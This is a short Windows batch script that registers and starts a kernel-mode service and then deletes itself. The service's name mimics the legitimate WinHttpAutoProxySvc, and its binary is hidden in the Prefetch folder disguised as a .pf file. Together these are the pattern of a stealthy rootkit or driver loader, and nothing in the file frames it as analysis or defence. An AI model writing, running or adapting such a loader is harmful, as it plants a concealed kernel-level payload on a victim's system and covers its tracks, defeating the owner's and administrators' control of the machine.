@echo off
cd %~dp0
sc create WinHttpAutoProxySvc287_c binpath=C:\Windows\Prefetch\UPDATE.EXE-E632877B.pf type=kernel
sc start WinHttpAutoProxySvc287_c
del "%~f0"